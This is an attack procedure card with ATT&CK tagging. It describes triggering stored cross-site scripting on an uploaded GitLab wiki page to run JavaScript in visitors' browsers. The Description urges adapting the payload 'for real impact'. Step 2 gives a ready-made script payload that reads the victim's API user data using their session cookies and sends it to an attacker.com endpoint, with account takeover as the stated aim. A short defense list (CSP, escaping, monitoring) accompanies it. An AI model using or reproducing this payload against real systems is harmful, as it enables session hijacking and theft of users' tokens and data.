---
id: proc-004
tags:
  - xss-trigger
  - javascript-execution
  - token-theft
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
  - Browser
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Keylogging]]'
updated_at: '2025-12-14T03:46:37.771Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Keylogging]]'
---
# Trigger-XSS-Execution-on-Wiki-Page

## Summary

This procedure involves accessing the uploaded wiki page to trigger the rendering of malicious HTML, resulting in JavaScript execution in the victim's browser and potential data exfiltration.

## Description

Once the HTML is pushed, the wiki page at /wikis/index.html renders the content directly. Without sanitization or CSP, the <script> executes immediately. Victims (e.g., GitLab users browsing public wikis) can have sessions hijacked. Adapt payload for real impact: fetch victim tokens and send to attacker endpoint.

## Requirements

1. Uploaded malicious HTML in public wiki
2. Victim browser (any modern)
3. Public URL accessible

## Defense

Defensive measures and detection strategies:

- Implement strict CSP (e.g., script-src 'self')
- HTML-escape wiki content on render
- Monitor for anomalous JS execution in browser logs

## Objectives

1. Execute arbitrary JS in victim context
2. Capture sensitive data like API tokens
3. Achieve account takeover or data exposure

## Instructions

### Step 1: Access Wiki Page

**Context**: Visit the URL to trigger rendering.

No command; use browser:

1. Open https://gitlab.com/dummy/test/wikis/index.html
2. Observe execution (e.g., alert or console log)

> Expected output: Script runs; alert('Hello world!') or network exfil.

### Step 2: Verify Impact

**Context**: Check for token theft in advanced payload.

Adapt payload: <script>fetch('/api/v4/user', {credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://attacker.com/steal?t='+encodeURIComponent(t)))</script>

> Expected output: Token sent to attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Keylogging]] Input Capture

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss-trigger
- javascript-execution
